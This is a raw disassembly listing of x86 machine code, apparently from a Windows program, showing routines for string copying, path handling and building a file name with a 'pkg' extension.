  402492:	80 bc 24 08 10 00 00 	cmpb   $0x0,0x1008(%esp)
  402499:	00 
  40249a:	75 64                	jne    0x402500
  40249c:	8d 44 24 08          	lea    0x8(%esp),%eax
  4024a0:	68 d8 03 42 00       	push   $0x4203d8
  4024a5:	50                   	push   %eax
  4024a6:	e8 3f ab 00 00       	call   0x40cfea
  4024ab:	8b d7                	mov    %edi,%edx
  4024ad:	83 c4 08             	add    $0x8,%esp
  4024b0:	2b d0                	sub    %eax,%edx
  4024b2:	8a 08                	mov    (%eax),%cl
  4024b4:	8d 40 01             	lea    0x1(%eax),%eax
  4024b7:	88 4c 02 ff          	mov    %cl,-0x1(%edx,%eax,1)
  4024bb:	84 c9                	test   %cl,%cl
  4024bd:	75 f3                	jne    0x4024b2
  4024bf:	68 d8 03 42 00       	push   $0x4203d8
  4024c4:	6a 00                	push   $0x0
  4024c6:	e8 1f ab 00 00       	call   0x40cfea
  4024cb:	8b d6                	mov    %esi,%edx
  4024cd:	83 c4 08             	add    $0x8,%esp
  4024d0:	2b d0                	sub    %eax,%edx
  4024d2:	8a 08                	mov    (%eax),%cl
  4024d4:	8d 40 01             	lea    0x1(%eax),%eax
  4024d7:	88 4c 02 ff          	mov    %cl,-0x1(%edx,%eax,1)
  4024db:	84 c9                	test   %cl,%cl
  4024dd:	75 f3                	jne    0x4024d2
  4024df:	38 0f                	cmp    %cl,(%edi)
  4024e1:	74 1d                	je     0x402500
  4024e3:	38 0e                	cmp    %cl,(%esi)
  4024e5:	74 19                	je     0x402500
  4024e7:	5f                   	pop    %edi
  4024e8:	33 c0                	xor    %eax,%eax
  4024ea:	5e                   	pop    %esi
  4024eb:	8b 8c 24 04 10 00 00 	mov    0x1004(%esp),%ecx
  4024f2:	33 cc                	xor    %esp,%ecx
  4024f4:	e8 6b 55 00 00       	call   0x407a64
  4024f9:	81 c4 08 10 00 00    	add    $0x1008,%esp
  4024ff:	c3                   	ret
  402500:	8b 8c 24 0c 10 00 00 	mov    0x100c(%esp),%ecx
  402507:	83 c8 ff             	or     $0xffffffff,%eax
  40250a:	5f                   	pop    %edi
  40250b:	5e                   	pop    %esi
  40250c:	33 cc                	xor    %esp,%ecx
  40250e:	e8 51 55 00 00       	call   0x407a64
  402513:	81 c4 08 10 00 00    	add    $0x1008,%esp
  402519:	c3                   	ret
  40251a:	cc                   	int3
  40251b:	cc                   	int3
  40251c:	cc                   	int3
  40251d:	cc                   	int3
  40251e:	cc                   	int3
  40251f:	cc                   	int3
  402520:	b8 08 30 00 00       	mov    $0x3008,%eax
  402525:	e8 56 55 00 00       	call   0x407a80
  40252a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40252f:	33 c4                	xor    %esp,%eax
  402531:	89 84 24 04 30 00 00 	mov    %eax,0x3004(%esp)
  402538:	56                   	push   %esi
  402539:	8b b4 24 14 30 00 00 	mov    0x3014(%esp),%esi
  402540:	57                   	push   %edi
  402541:	6a 00                	push   $0x0
  402543:	6a 02                	push   $0x2
  402545:	89 74 24 10          	mov    %esi,0x10(%esp)
  402549:	e8 f0 86 00 00       	call   0x40ac3e
  40254e:	83 c4 04             	add    $0x4,%esp
  402551:	50                   	push   %eax
  402552:	e8 12 b3 00 00       	call   0x40d869
  402557:	68 78 40 00 00       	push   $0x4078
  40255c:	6a 01                	push   $0x1
  40255e:	e8 fb b2 00 00       	call   0x40d85e
  402563:	8b f8                	mov    %eax,%edi
  402565:	83 c4 10             	add    $0x10,%esp
  402568:	85 ff                	test   %edi,%edi
  40256a:	75 2c                	jne    0x402598
  40256c:	68 a8 05 42 00       	push   $0x4205a8
  402571:	68 d4 05 42 00       	push   $0x4205d4
  402576:	e8 75 f2 ff ff       	call   0x4017f0
  40257b:	83 c4 08             	add    $0x8,%esp
  40257e:	83 c8 ff             	or     $0xffffffff,%eax
  402581:	5f                   	pop    %edi
  402582:	5e                   	pop    %esi
  402583:	8b 8c 24 04 30 00 00 	mov    0x3004(%esp),%ecx
  40258a:	33 cc                	xor    %esp,%ecx
  40258c:	e8 d3 54 00 00       	call   0x407a64
  402591:	81 c4 08 30 00 00    	add    $0x3008,%esp
  402597:	c3                   	ret
  402598:	53                   	push   %ebx
  402599:	ff 36                	push   (%esi)
  40259b:	8d 84 24 14 10 00 00 	lea    0x1014(%esp),%eax
  4025a2:	50                   	push   %eax
  4025a3:	e8 98 02 00 00       	call   0x402840
  4025a8:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  4025af:	50                   	push   %eax
  4025b0:	8d 84 24 1c 20 00 00 	lea    0x201c(%esp),%eax
  4025b7:	50                   	push   %eax
  4025b8:	e8 43 02 00 00       	call   0x402800
  4025bd:	8d 84 24 20 10 00 00 	lea    0x1020(%esp),%eax
  4025c4:	50                   	push   %eax
  4025c5:	8d 44 24 24          	lea    0x24(%esp),%eax
  4025c9:	50                   	push   %eax
  4025ca:	e8 21 04 00 00       	call   0x4029f0
  4025cf:	68 dc 05 42 00       	push   $0x4205dc
  4025d4:	e8 b7 18 00 00       	call   0x403e90
  4025d9:	68 dc 05 42 00       	push   $0x4205dc
  4025de:	8b d8                	mov    %eax,%ebx
  4025e0:	e8 3b 1e 00 00       	call   0x404420
  4025e5:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4025e9:	83 c4 20             	add    $0x20,%esp
  4025ec:	8d 51 01             	lea    0x1(%ecx),%edx
  4025ef:	90                   	nop
  4025f0:	8a 01                	mov    (%ecx),%al
  4025f2:	41                   	inc    %ecx
  4025f3:	84 c0                	test   %al,%al
  4025f5:	75 f9                	jne    0x4025f0
  4025f7:	2b ca                	sub    %edx,%ecx
  4025f9:	8d 84 24 10 10 00 00 	lea    0x1010(%esp),%eax
  402600:	03 c1                	add    %ecx,%eax
  402602:	50                   	push   %eax
  402603:	8d 44 24 14          	lea    0x14(%esp),%eax
  402607:	50                   	push   %eax
  402608:	57                   	push   %edi
  402609:	e8 42 f1 ff ff       	call   0x401750
  40260e:	83 c4 0c             	add    $0xc,%esp
  402611:	85 c0                	test   %eax,%eax
  402613:	74 68                	je     0x40267d
  402615:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402619:	8d 51 01             	lea    0x1(%ecx),%edx
  40261c:	0f 1f 40 00          	nopl   0x0(%eax)
  402620:	8a 01                	mov    (%ecx),%al
  402622:	41                   	inc    %ecx
  402623:	84 c0                	test   %al,%al
  402625:	75 f9                	jne    0x402620
  402627:	2b ca                	sub    %edx,%ecx
  402629:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  402630:	03 c1                	add    %ecx,%eax
  402632:	50                   	push   %eax
  402633:	8d 44 24 14          	lea    0x14(%esp),%eax
  402637:	50                   	push   %eax
  402638:	57                   	push   %edi
  402639:	e8 12 f1 ff ff       	call   0x401750
  40263e:	83 c4 0c             	add    $0xc,%esp
  402641:	85 c0                	test   %eax,%eax
  402643:	74 38                	je     0x40267d
  402645:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  40264c:	50                   	push   %eax
  40264d:	8d 84 24 14 10 00 00 	lea    0x1014(%esp),%eax
  402654:	50                   	push   %eax
  402655:	68 e8 05 42 00       	push   $0x4205e8
  40265a:	e8 b1 f3 ff ff       	call   0x401a10
  40265f:	83 c4 0c             	add    $0xc,%esp
  402662:	83 c8 ff             	or     $0xffffffff,%eax
  402665:	5b                   	pop    %ebx
  402666:	5f                   	pop    %edi
  402667:	5e                   	pop    %esi
  402668:	8b 8c 24 04 30 00 00 	mov    0x3004(%esp),%ecx
  40266f:	33 cc                	xor    %esp,%ecx
  402671:	e8 ee 53 00 00       	call   0x407a64
  402676:	81 c4 08 30 00 00    	add    $0x3008,%esp
  40267c:	c3                   	ret
  40267d:	89 b7 74 40 00 00    	mov    %esi,0x4074(%edi)
  402683:	55                   	push   %ebp
  402684:	8b ac 24 1c 30 00 00 	mov    0x301c(%esp),%ebp
  40268b:	89 af 70 40 00 00    	mov    %ebp,0x4070(%edi)
  402691:	85 db                	test   %ebx,%ebx
  402693:	75 15                	jne    0x4026aa
  402695:	57                   	push   %edi
  402696:	e8 85 fb ff ff       	call   0x402220
  40269b:	83 c4 04             	add    $0x4,%esp
  40269e:	85 c0                	test   %eax,%eax
  4026a0:	0f 85 b7 00 00 00    	jne    0x40275d
  4026a6:	8d 5c 24 14          	lea    0x14(%esp),%ebx
  4026aa:	6a 00                	push   $0x0
  4026ac:	53                   	push   %ebx
  4026ad:	6a 00                	push   $0x0
  4026af:	e8 7c 26 00 00       	call   0x404d30
  4026b4:	83 c4 0c             	add    $0xc,%esp
  4026b7:	8b f0                	mov    %eax,%esi
  4026b9:	56                   	push   %esi
  4026ba:	ff 15 0c 00 42 00    	call   *0x42000c
  4026c0:	56                   	push   %esi
  4026c1:	e8 90 75 00 00       	call   0x409c56
  4026c6:	83 c4 04             	add    $0x4,%esp
  4026c9:	85 db                	test   %ebx,%ebx
  4026cb:	0f 84 8c 00 00 00    	je     0x40275d
  4026d1:	8b cb                	mov    %ebx,%ecx
  4026d3:	8d 44 24 14          	lea    0x14(%esp),%eax
  4026d7:	8a 10                	mov    (%eax),%dl
  4026d9:	3a 11                	cmp    (%ecx),%dl
  4026db:	75 1a                	jne    0x4026f7
  4026dd:	84 d2                	test   %dl,%dl
  4026df:	74 12                	je     0x4026f3
  4026e1:	8a 50 01             	mov    0x1(%eax),%dl
  4026e4:	3a 51 01             	cmp    0x1(%ecx),%dl
  4026e7:	75 0e                	jne    0x4026f7
  4026e9:	83 c0 02             	add    $0x2,%eax
  4026ec:	83 c1 02             	add    $0x2,%ecx
  4026ef:	84 d2                	test   %dl,%dl
  4026f1:	75 e4                	jne    0x4026d7
  4026f3:	33 c0                	xor    %eax,%eax
  4026f5:	eb 05                	jmp    0x4026fc
  4026f7:	1b c0                	sbb    %eax,%eax
  4026f9:	83 c8 01             	or     $0x1,%eax
  4026fc:	85 c0                	test   %eax,%eax
  4026fe:	74 41                	je     0x402741
  402700:	68 00 10 00 00       	push   $0x1000
  402705:	8d b7 68 20 00 00    	lea    0x2068(%edi),%esi
  40270b:	53                   	push   %ebx
  40270c:	56                   	push   %esi
  40270d:	e8 ae a7 00 00       	call   0x40cec0
  402712:	83 c4 0c             	add    $0xc,%esp
  402715:	80 bf 67 30 00 00 00 	cmpb   $0x0,0x3067(%edi)
  40271c:	0f 85 7f 00 00 00    	jne    0x4027a1
  402722:	8d 8f 68 30 00 00    	lea    0x3068(%edi),%ecx
  402728:	c7 87 68 40 00 00 01 	movl   $0x1,0x4068(%edi)
  40272f:	00 00 00 
  402732:	2b ce                	sub    %esi,%ecx
  402734:	8a 06                	mov    (%esi),%al
  402736:	8d 76 01             	lea    0x1(%esi),%esi
  402739:	88 44 31 ff          	mov    %al,-0x1(%ecx,%esi,1)
  40273d:	84 c0                	test   %al,%al
  40273f:	75 f3                	jne    0x402734
  402741:	57                   	push   %edi
  402742:	e8 99 fa ff ff       	call   0x4021e0
  402747:	57                   	push   %edi
  402748:	e8 63 f9 ff ff       	call   0x4020b0
  40274d:	57                   	push   %edi
  40274e:	8b d8                	mov    %eax,%ebx
  402750:	e8 7b fa ff ff       	call   0x4021d0
  402755:	83 c4 0c             	add    $0xc,%esp
  402758:	e9 81 00 00 00       	jmp    0x4027de
  40275d:	57                   	push   %edi
  40275e:	e8 ad f9 ff ff       	call   0x402110
  402763:	83 c4 04             	add    $0x4,%esp
  402766:	85 c0                	test   %eax,%eax
  402768:	75 37                	jne    0x4027a1
  40276a:	80 bf 68 20 00 00 00 	cmpb   $0x0,0x2068(%edi)
  402771:	8d b7 68 20 00 00    	lea    0x2068(%edi),%esi
  402777:	8d 44 24 14          	lea    0x14(%esp),%eax
  40277b:	0f 45 c6             	cmovne %esi,%eax
  40277e:	50                   	push   %eax
  40277f:	68 dc 05 42 00       	push   $0x4205dc
  402784:	e8 57 1c 00 00       	call   0x4043e0
  402789:	68 dc 05 42 00       	push   $0x4205dc
  40278e:	e8 fd 16 00 00       	call   0x403e90
  402793:	57                   	push   %edi
  402794:	e8 17 5b 00 00       	call   0x4082b0
  402799:	83 c4 10             	add    $0x10,%esp
  40279c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40279f:	75 05                	jne    0x4027a6
  4027a1:	83 c8 ff             	or     $0xffffffff,%eax
  4027a4:	eb 3a                	jmp    0x4027e0
  4027a6:	e8 75 6c 00 00       	call   0x409420
  4027ab:	ff 74 24 10          	push   0x10(%esp)
  4027af:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  4027b6:	55                   	push   %ebp
  4027b7:	57                   	push   %edi
  4027b8:	50                   	push   %eax
  4027b9:	e8 92 1c 00 00       	call   0x404450
  4027be:	83 c4 10             	add    $0x10,%esp
  4027c1:	8b d8                	mov    %eax,%ebx
  4027c3:	83 bf 68 40 00 00 01 	cmpl   $0x1,0x4068(%edi)
  4027ca:	75 09                	jne    0x4027d5
  4027cc:	56                   	push   %esi
  4027cd:	e8 5e 19 00 00       	call   0x404130
  4027d2:	83 c4 04             	add    $0x4,%esp
  4027d5:	57                   	push   %edi
  4027d6:	e8 c5 ef ff ff       	call   0x4017a0
  4027db:	83 c4 04             	add    $0x4,%esp
  4027de:	8b c3                	mov    %ebx,%eax
  4027e0:	8b 8c 24 14 30 00 00 	mov    0x3014(%esp),%ecx
  4027e7:	5d                   	pop    %ebp
  4027e8:	5b                   	pop    %ebx
  4027e9:	5f                   	pop    %edi
  4027ea:	5e                   	pop    %esi
  4027eb:	33 cc                	xor    %esp,%ecx
  4027ed:	e8 72 52 00 00       	call   0x407a64
  4027f2:	81 c4 08 30 00 00    	add    $0x3008,%esp
  4027f8:	c3                   	ret
  4027f9:	cc                   	int3
  4027fa:	cc                   	int3
  4027fb:	cc                   	int3
  4027fc:	cc                   	int3
  4027fd:	cc                   	int3
  4027fe:	cc                   	int3
  4027ff:	cc                   	int3
  402800:	8b 44 24 08          	mov    0x8(%esp),%eax
  402804:	56                   	push   %esi
  402805:	8b 74 24 08          	mov    0x8(%esp),%esi
  402809:	8b d6                	mov    %esi,%edx
  40280b:	2b d0                	sub    %eax,%edx
  40280d:	0f 1f 00             	nopl   (%eax)
  402810:	8a 08                	mov    (%eax),%cl
  402812:	8d 40 01             	lea    0x1(%eax),%eax
  402815:	88 4c 02 ff          	mov    %cl,-0x1(%edx,%eax,1)
  402819:	84 c9                	test   %cl,%cl
  40281b:	75 f3                	jne    0x402810
  40281d:	8b ce                	mov    %esi,%ecx
  40281f:	8d 51 01             	lea    0x1(%ecx),%edx
  402822:	8a 01                	mov    (%ecx),%al
  402824:	41                   	inc    %ecx
  402825:	84 c0                	test   %al,%al
  402827:	75 f9                	jne    0x402822
  402829:	2b ca                	sub    %edx,%ecx
  40282b:	c7 44 31 fd 70 6b 67 	movl   $0x676b70,-0x3(%ecx,%esi,1)
  402832:	00 
  402833:	5e                   	pop    %esi
  402834:	c3                   	ret
  402835:	cc                   	int3
  402836:	cc                   	int3
  402837:	cc                   	int3
  402838:	cc                   	int3
  402839:	cc                   	int3
  40283a:	cc                   	int3
  40283b:	cc                   	int3
  40283c:	cc                   	int3
  40283d:	cc                   	int3
  40283e:	cc                   	int3
  40283f:	cc                   	int3
  402840:	b8 04 20 00 00       	mov    $0x2004,%eax
  402845:	e8 36 52 00 00       	call   0x407a80
  40284a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40284f:	33 c4                	xor    %esp,%eax
  402851:	89 84 24 00 20 00 00 	mov    %eax,0x2000(%esp)
  402858:	56                   	push   %esi
  402859:	8b b4 24 0c 20 00 00 	mov    0x200c(%esp),%esi
  402860:	8d 44 24 04          	lea    0x4(%esp),%eax
  402864:	68 00 10 00 00       	push   $0x1000
  402869:	50                   	push   %eax
  40286a:	6a 00                	push   $0x0
  40286c:	ff 15 10 00 42 00    	call   *0x420010
  402872:	85 c0                	test   %eax,%eax
  402874:	75 2b                	jne    0x4028a1
  402876:	68 0c 06 42 00       	push   $0x42060c
  40287b:	68 2c 06 42 00       	push   $0x42062c
  402880:	e8 7b f0 ff ff       	call   0x401900
  402885:	83 c4 08             	add    $0x8,%esp
  402888:	83 c8 ff             	or     $0xffffffff,%eax
  40288b:	5e                   	pop    %esi
  40288c:	8b 8c 24 00 20 00 00 	mov    0x2000(%esp),%ecx
  402893:	33 cc                	xor    %esp,%ecx
  402895:	e8 ca 51 00 00       	call   0x407a64
  40289a:	81 c4 04 20 00 00    	add    $0x2004,%esp
  4028a0:	c3                   	ret
  4028a1:	68 00 10 00 00       	push   $0x1000
  4028a6:	8d 44 24 08          	lea    0x8(%esp),%eax
  4028aa:	50                   	push   %eax
  4028ab:	56                   	push   %esi
  4028ac:	e8 0f 25 00 00       	call   0x404dc0
  4028b1:	83 c4 0c             	add    $0xc,%esp
  4028b4:	85 c0                	test   %eax,%eax
  4028b6:	75 26                	jne    0x4028de
  4028b8:	68 40 06 42 00       	push   $0x420640
  4028bd:	e8 4e f1 ff ff       	call   0x401a10
  4028c2:	83 c4 04             	add    $0x4,%esp
  4028c5:	83 c8 ff             	or     $0xffffffff,%eax
  4028c8:	5e                   	pop    %esi
  4028c9:	8b 8c 24 00 20 00 00 	mov    0x2000(%esp),%ecx
  4028d0:	33 cc                	xor    %esp,%ecx
  4028d2:	e8 8d 51 00 00       	call   0x407a64
  4028d7:	81 c4 04 20 00 00    	add    $0x2004,%esp
  4028dd:	c3                   	ret
  4028de:	8b 8c 24 04 20 00 00 	mov    0x2004(%esp),%ecx
  4028e5:	33 c0                	xor    %eax,%eax
  4028e7:	5e                   	pop    %esi
  4028e8:	33 cc                	xor    %esp,%ecx
  4028ea:	e8 75 51 00 00       	call   0x407a64
  4028ef:	81 c4 04 20 00 00    	add    $0x2004,%esp
  4028f5:	c3                   	ret
  4028f6:	cc                   	int3
  4028f7:	cc                   	int3
  4028f8:	cc                   	int3
  4028f9:	cc                   	int3
  4028fa:	cc                   	int3
  4028fb:	cc                   	int3
  4028fc:	cc                   	int3
  4028fd:	cc                   	int3
  4028fe:	cc                   	int3
  4028ff:	cc                   	int3
  402900:	b8 38 20 00 00       	mov    $0x2038,%eax
  402905:	e8 76 51 00 00       	call   0x407a80
  40290a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40290f:	33 c4                	xor    %esp,%eax
  402911:	89 84 24 34 20 00 00 	mov    %eax,0x2034(%esp)
  402918:	8b 84 24 3c 20 00 00 	mov    0x203c(%esp),%eax
  40291f:	68 00 10 00 00       	push   $0x1000
  402924:	50                   	push   %eax
  402925:	8d 44 24 38          	lea    0x38(%esp),%eax
  402929:	50                   	push   %eax
  40292a:	e8 01 24 00 00       	call   0x404d30
  40292f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402933:	50                   	push   %eax
  402934:	8d 44 24 40          	lea    0x40(%esp),%eax
  402938:	50                   	push   %eax
  402939:	e8 15 af 00 00       	call   0x40d853
  40293e:	8b 8c 24 48 20 00 00 	mov    0x2048(%esp),%ecx
  402945:	83 c4 14             	add    $0x14,%esp
  402948:	f7 d8                	neg    %eax
  40294a:	1b c0                	sbb    %eax,%eax
  40294c:	33 cc                	xor    %esp,%ecx
  40294e:	40                   	inc    %eax
  40294f:	e8 10 51 00 00       	call   0x407a64
  402954:	81 c4 38 20 00 00    	add    $0x2038,%esp
  40295a:	c3                   	ret
  40295b:	cc                   	int3
  40295c:	cc                   	int3
  40295d:	cc                   	int3
  40295e:	cc                   	int3
  40295f:	cc                   	int3
  402960:	81 ec 20 02 00 00    	sub    $0x220,%esp
  402966:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40296b:	33 c4                	xor    %esp,%eax
  40296d:	89 84 24 1c 02 00 00 	mov    %eax,0x21c(%esp)
  402974:	8b 84 24 24 02 00 00 	mov    0x224(%esp),%eax
  40297b:	56                   	push   %esi
  40297c:	8b b4 24 2c 02 00 00 	mov    0x22c(%esp),%esi
  402983:	68 04 01 00 00       	push   $0x104
  402988:	50                   	push   %eax
  402989:	8d 44 24 20          	lea    0x20(%esp),%eax
  40298d:	50                   	push   %eax
  40298e:	e8 9d 23 00 00       	call   0x404d30
  402993:	6a 0a                	push   $0xa
  402995:	8d 44 24 14          	lea    0x14(%esp),%eax
  402999:	56                   	push   %esi
  40299a:	50                   	push   %eax
  40299b:	e8 90 23 00 00       	call   0x404d30
  4029a0:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4029a4:	50                   	push   %eax
  4029a5:	8d 44 24 34          	lea    0x34(%esp),%eax
  4029a9:	50                   	push   %eax
  4029aa:	e8 3e b3 00 00       	call   0x40dced
  4029af:	8b 8c 24 40 02 00 00 	mov    0x240(%esp),%ecx
  4029b6:	83 c4 20             	add    $0x20,%esp
  4029b9:	5e                   	pop    %esi
  4029ba:	33 cc                	xor    %esp,%ecx
  4029bc:	e8 a3 50 00 00       	call   0x407a64
  4029c1:	81 c4 20 02 00 00    	add    $0x220,%esp
  4029c7:	c3                   	ret
  4029c8:	cc                   	int3
  4029c9:	cc                   	int3
  4029ca:	cc                   	int3
  4029cb:	cc                   	int3
  4029cc:	cc                   	int3
  4029cd:	cc                   	int3
  4029ce:	cc                   	int3
  4029cf:	cc                   	int3
  4029d0:	ff 74 24 08          	push   0x8(%esp)
  4029d4:	ff 74 24 10          	push   0x10(%esp)
  4029d8:	ff 74 24 0c          	push   0xc(%esp)
  4029dc:	e8 9e b1 00 00       	call   0x40db7f
  4029e1:	83 c4 0c             	add    $0xc,%esp
  4029e4:	f7 d8                	neg    %eax
  4029e6:	1b c0                	sbb    %eax,%eax
  4029e8:	f7 d8                	neg    %eax
  4029ea:	c3                   	ret
  4029eb:	cc                   	int3
  4029ec:	cc                   	int3
  4029ed:	cc                   	int3
  4029ee:	cc                   	int3
  4029ef:	cc                   	int3
  4029f0:	8b 54 24 08          	mov    0x8(%esp),%edx
  4029f4:	8b ca                	mov    %edx,%ecx
  4029f6:	56                   	push   %esi
  4029f7:	8d 71 01             	lea    0x1(%ecx),%esi
  4029fa:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  402a00:	8a 01                	mov    (%ecx),%al
  402a02:	41                   	inc    %ecx
  402a03:	84 c0                	test   %al,%al
  402a05:	75 f9                	jne    0x402a00
  402a07:	2b ce                	sub    %esi,%ecx
  402a09:	8b 74 24 08          	mov    0x8(%esp),%esi
  402a0d:	8d 41 01             	lea    0x1(%ecx),%eax
  402a10:	50                   	push   %eax
  402a11:	52                   	push   %edx
  402a12:	56                   	push   %esi
  402a13:	e8 a8 a4 00 00       	call   0x40cec0
  402a18:	8b ce                	mov    %esi,%ecx
  402a1a:	83 c4 0c             	add    $0xc,%esp
  402a1d:	8d 51 01             	lea    0x1(%ecx),%edx
  402a20:	8a 01                	mov    (%ecx),%al
  402a22:	41                   	inc    %ecx
  402a23:	84 c0                	test   %al,%al
  402a25:	75 f9                	jne    0x402a20
  402a27:	2b ca                	sub    %edx,%ecx
  402a29:	80 3c 31 5c          	cmpb   $0x5c,(%ecx,%esi,1)
  402a2d:	75 03                	jne    0x402a32
  402a2f:	88 04 31             	mov    %al,(%ecx,%esi,1)
  402a32:	6a 5c                	push   $0x5c
  402a34:	56                   	push   %esi
  402a35:	e8 d6 5f 00 00       	call   0x408a10
  402a3a:	83 c4 08             	add    $0x8,%esp
  402a3d:	85 c0                	test   %eax,%eax
  402a3f:	74 05                	je     0x402a46
  402a41:	c6 00 00             	movb   $0x0,(%eax)
  402a44:	5e                   	pop    %esi
  402a45:	c3                   	ret
  402a46:	66 c7 06 2e 00       	movw   $0x2e,(%esi)
  402a4b:	5e                   	pop    %esi
  402a4c:	c3                   	ret
  402a4d:	cc                   	int3
  402a4e:	cc                   	int3
  402a4f:	cc                   	int3
  402a50:	53                   	push   %ebx
  402a51:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  402a55:	55                   	push   %ebp
  402a56:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  402a5a:	56                   	push   %esi
  402a5b:	57                   	push   %edi
  402a5c:	8b 7c 24 18          	mov    0x18(%esp),%edi
  402a60:	85 ed                	test   %ebp,%ebp
  402a62:	75 41                	jne    0x402aa5
  402a64:	8b cf                	mov    %edi,%ecx
  402a66:	8d 51 01             	lea    0x1(%ecx),%edx
  402a69:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  402a70:	8a 01                	mov    (%ecx),%al
  402a72:	41                   	inc    %ecx
  402a73:	84 c0                	test   %al,%al
  402a75:	75 f9                	jne    0x402a70
  402a77:	2b ca                	sub    %edx,%ecx
  402a79:	8b d3                	mov    %ebx,%edx
  402a7b:	8d 72 01             	lea    0x1(%edx),%esi
  402a7e:	66 90                	xchg   %ax,%ax
  402a80:	8a 02                	mov    (%edx),%al
  402a82:	42                   	inc    %edx
  402a83:	84 c0                	test   %al,%al
  402a85:	75 f9                	jne    0x402a80
  402a87:	2b d6                	sub    %esi,%edx
  402a89:	8d 71 02             	lea    0x2(%ecx),%esi
  402a8c:	03 f2                	add    %edx,%esi
  402a8e:	56                   	push   %esi
  402a8f:	e8 c7 71 00 00       	call   0x409c5b
  402a94:	8b e8                	mov    %eax,%ebp
  402a96:	83 c4 04             	add    $0x4,%esp
  402a99:	85 ed                	test   %ebp,%ebp
  402a9b:	75 05                	jne    0x402aa2
  402a9d:	5f                   	pop    %edi
  402a9e:	5e                   	pop    %esi
  402a9f:	5d                   	pop    %ebp
  402aa0:	5b                   	pop    %ebx
  402aa1:	c3                   	ret
  402aa2:	56                   	push   %esi
  402aa3:	eb 05                	jmp    0x402aaa
  402aa5:	68 00 10 00 00       	push   $0x1000
  402aaa:	6a 00                	push   $0x0
  402aac:	55                   	push   %ebp
  402aad:	e8 ce 5c 00 00       	call   0x408780
  402ab2:	8b cf                	mov    %edi,%ecx
  402ab4:	83 c4 0c             	add    $0xc,%esp
  402ab7:	8d 51 01             	lea    0x1(%ecx),%edx
  402aba:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  402ac0:	8a 01                	mov    (%ecx),%al
  402ac2:	41                   	inc    %ecx
  402ac3:	84 c0                	test   %al,%al
  402ac5:	75 f9                	jne    0x402ac0
  402ac7:	2b ca                	sub    %edx,%ecx
  402ac9:	51                   	push   %ecx
  402aca:	57                   	push   %edi
  402acb:	55                   	push   %ebp
  402acc:	e8 ef a3 00 00       	call   0x40cec0
  402ad1:	8b cd                	mov    %ebp,%ecx
  402ad3:	83 c4 0c             	add    $0xc,%esp
  402ad6:	8d 51 01             	lea    0x1(%ecx),%edx
  402ad9:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  402ae0:	8a 01                	mov    (%ecx),%al
  402ae2:	41                   	inc    %ecx
  402ae3:	84 c0                	test   %al,%al
  402ae5:	75 f9                	jne    0x402ae0
  402ae7:	2b ca                	sub    %edx,%ecx
  402ae9:	80 7c 29 ff 5c       	cmpb   $0x5c,-0x1(%ecx,%ebp,1)
  402aee:	74 06                	je     0x402af6
  402af0:	66 c7 04 29 5c 00    	movw   $0x5c,(%ecx,%ebp,1)
  402af6:	8b cb                	mov    %ebx,%ecx
  402af8:	8d 51 01             	lea    0x1(%ecx),%edx
  402afb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  402b00:	8a 01                	mov    (%ecx),%al
  402b02:	41                   	inc    %ecx
  402b03:	84 c0                	test   %al,%al
  402b05:	75 f9                	jne    0x402b00
  402b07:	2b ca                	sub    %edx,%ecx
  402b09:	80 7c 19 ff 5c       	cmpb   $0x5c,-0x1(%ecx,%ebx,1)
  402b0e:	75 15                	jne    0x402b25
  402b10:	8d 41 fe             	lea    -0x2(%ecx),%eax
  402b13:	50                   	push   %eax
  402b14:	53                   	push   %ebx
  402b15:	55                   	push   %ebp
  402b16:	e8 85 ad 00 00       	call   0x40d8a0
  402b1b:	83 c4 0c             	add    $0xc,%esp
  402b1e:	8b c5                	mov    %ebp,%eax
  402b20:	5f                   	pop    %edi
  402b21:	5e                   	pop    %esi
  402b22:	5d                   	pop    %ebp
  402b23:	5b                   	pop    %ebx
  402b24:	c3                   	ret
  402b25:	8b f3                	mov    %ebx,%esi
  402b27:	8a 03                	mov    (%ebx),%al
  402b29:	43                   	inc    %ebx
  402b2a:	84 c0                	test   %al,%al
  402b2c:	75 f9                	jne    0x402b27
  402b2e:	2b de                	sub    %esi,%ebx
  402b30:	8d 7d ff             	lea    -0x1(%ebp),%edi
  402b33:	8a 47 01             	mov    0x1(%edi),%al
  402b36:	47                   	inc    %edi
  402b37:	84 c0                	test   %al,%al
  402b39:	75 f8                	jne    0x402b33
  402b3b:	8b cb                	mov    %ebx,%ecx
  402b3d:	8b c5                	mov    %ebp,%eax
  402b3f:	c1 e9 02             	shr    $0x2,%ecx
  402b42:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402b44:	8b cb                	mov    %ebx,%ecx
  402b46:	83 e1 03             	and    $0x3,%ecx
  402b49:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402b4b:	5f                   	pop    %edi
  402b4c:	5e                   	pop    %esi
  402b4d:	5d                   	pop    %ebp
  402b4e:	5b                   	pop    %ebx
  402b4f:	c3                   	ret
  402b50:	cc                   	int3
  402b51:	cc                   	int3
  402b52:	cc                   	int3
  402b53:	cc                   	int3
  402b54:	cc                   	int3
  402b55:	cc                   	int3
  402b56:	cc                   	int3
  402b57:	cc                   	int3
  402b58:	cc                   	int3
  402b59:	cc                   	int3
  402b5a:	cc                   	int3
  402b5b:	cc                   	int3
  402b5c:	cc                   	int3
  402b5d:	cc                   	int3
  402b5e:	cc                   	int3
  402b5f:	cc                   	int3
  402b60:	cc                   	int3
  402b61:	cc                   	int3
  402b62:	cc                   	int3
  402b63:	cc                   	int3
  402b64:	cc                   	int3
